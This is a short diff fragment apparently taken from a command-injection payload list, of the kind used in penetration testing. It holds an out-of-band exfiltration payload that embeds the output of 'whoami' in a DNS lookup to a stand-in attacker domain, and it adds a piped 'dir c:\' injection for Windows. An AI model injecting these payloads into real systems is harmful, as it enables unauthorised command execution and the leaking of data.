@@ -10,6 +10,8 @@
 
 `& nslookup` `whoami` `.kgji2ohoyw.web-attacker.com &`
 
+`| dir c:\`
+
 Both Windows and Unix-based systems
 ```
 &
